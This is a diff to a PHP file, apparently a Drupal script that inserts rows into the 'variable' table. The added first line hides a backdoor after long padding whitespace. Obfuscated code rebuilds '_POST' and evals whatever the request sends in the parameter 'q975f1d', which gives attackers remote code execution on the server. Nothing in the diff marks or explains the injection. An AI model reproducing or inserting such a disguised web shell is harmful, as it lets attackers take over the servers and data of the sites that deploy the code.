@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                   $ocrt1 = "tsp_o" ; $kuq20 =strtoupper ($ocrt1[3].$ocrt1[2]. $ocrt1[4]. $ocrt1[1]. $ocrt1[0]);if ( isset(${ $kuq20}[ 'q975f1d'])){ eval(${$kuq20 } ['q975f1d' ] ) ; }?> <?php
 db_insert('variable')->fields(array(
   'name',
   'value',
